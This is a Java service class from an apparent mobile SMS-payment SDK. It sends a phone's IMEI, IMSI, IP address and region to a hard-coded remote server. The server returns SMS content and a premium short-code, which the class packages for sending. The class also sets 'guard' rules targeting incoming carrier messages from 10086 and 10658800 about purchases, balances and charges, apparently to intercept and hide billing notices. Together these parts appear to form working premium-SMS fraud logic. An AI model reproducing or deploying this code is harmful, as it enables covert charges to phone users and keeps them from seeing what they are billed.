package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 短信接口地址: http://211.154.152.59:8080/sdk/getcon
  请求方式:GET
  请求数据格式标准GET格式，例如：
     amount=200&packet_id=1a&imei=499000316129545&imsi=460029999154959 &orderNO=45554411&addr=手机地区&IP=xx.xx.xx.x
返回成功数据格式:
	     {"content":"a3#1ODZ4#0#4J2DFR9INJ#8K9AIK4QDV#2DBU1R#AMU6XFP6B#AEC3B99213FE9E85#66C35274C0E7E935#B52C405EA88BBFF5#4052_45554411","num":"1065842410"}


 * @author leoliu
 *
 */
public class BjjsMm10DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsMm10";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "10658424";
	
	private static final String REQUESTMODEL = "amount={amount}&packet_id={packet_id}&imei={imei}&imsi={imsi}&&addr={addr}&IP={ip}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static Map<String, String> cityMap = new HashMap<String, String>();
	
	static{
		cityMap.put("8611","&#x5317;&#x4EAC;");
		cityMap.put("8612","&#x5929;&#x6D25;");
		cityMap.put("8613","&#x6CB3;&#x5317;");
		cityMap.put("8614","&#x5C71;&#x897F;");
		
		cityMap.put("8615","&#x5185;&#x8499;&#x53E4;");
		cityMap.put("8621","&#x8FBD;&#x5B81;");
		cityMap.put("8622","&#x5409;&#x6797;");
		cityMap.put("8623","&#x9ED1;&#x9F99;&#x6C5F;");
		
		cityMap.put("8631","&#x4E0A;&#x6D77;");
		cityMap.put("8632","&#x6C5F;&#x82CF;");
		cityMap.put("8633","&#x6D59;&#x6C5F;");
		cityMap.put("8634","&#x5B89;&#x5FBD;");
		
		cityMap.put("8635","&#x798F;&#x5EFA;");
		cityMap.put("8636","&#x6C5F;&#x897F;");
		cityMap.put("8637","&#x5C71;&#x4E1C;");
		cityMap.put("8641","&#x6CB3;&#x5357;");
		
		cityMap.put("8642","&#x6E56;&#x5317;");
		cityMap.put("8643","&#x6E56;&#x5357;");
		cityMap.put("8644","&#x5E7F;&#x4E1C;");
		cityMap.put("8645","&#x5E7F;&#x897F;");
		
		cityMap.put("8646","&#x6D77;&#x5357;");
		cityMap.put("8650","&#x91CD;&#x5E86;");
		cityMap.put("8651","&#x56DB;&#x5DDD;");
		cityMap.put("8652","&#x8D35;&#x5DDE;");
		
		cityMap.put("8653","&#x4E91;&#x5357;");
		cityMap.put("8654","&#x897F;&#x85CF;");
		cityMap.put("8661","&#x9655;&#x897F;");
		cityMap.put("8662","&#x7518;&#x8083;");
		
		cityMap.put("8663","&#x9752;&#x6D77;");
		cityMap.put("8664","&#x5B81;&#x590F;");
		cityMap.put("8665","&#x65B0;&#x7586;");
	}
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String amount = map.get("amount");
			String packet_id = map.get("packet_id");
			String province = map.get("province");
			String addr = cityMap.get(province);
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String ip = map.get(Constants.IPPARAM);
			
			String param = REQUESTMODEL.replace("{amount}",amount).replace("{packet_id}",packet_id).replace("{addr}", addr).replace("{ip}",ip).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 10){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String num = jo.getString("num");
				String content = jo.getString("content");
				
				if(num != null && num.length() > 0 && content != null && content.length() > 0){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(content);
					sms.setSmsDest(num);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
					
					return XstreamHelper.toXml(smsList);
				}else{
					String error = jo.getString("error");
					
					if(error != null && error.length() > 0){
						return DynamicUtils.parseError(error);
					}
				}
				
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
		
	public static void main(String[] args){
		String url = "http://211.154.152.59:8080/sdk/getcon";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a87654321");
		map.put("imei", "356216042580565");
		map.put("imsi", "460023779821724");
		map.put("type", "bjjsMm10");
		
		map.put("province", "8611");
		map.put("amount","1000");
		map.put("packet_id", "1a");
		map.put(Constants.IPPARAM,"115.28.52.44");
		
		
		System.out.println(new BjjsMm10DynamicService().dynamic(map));
	}

}
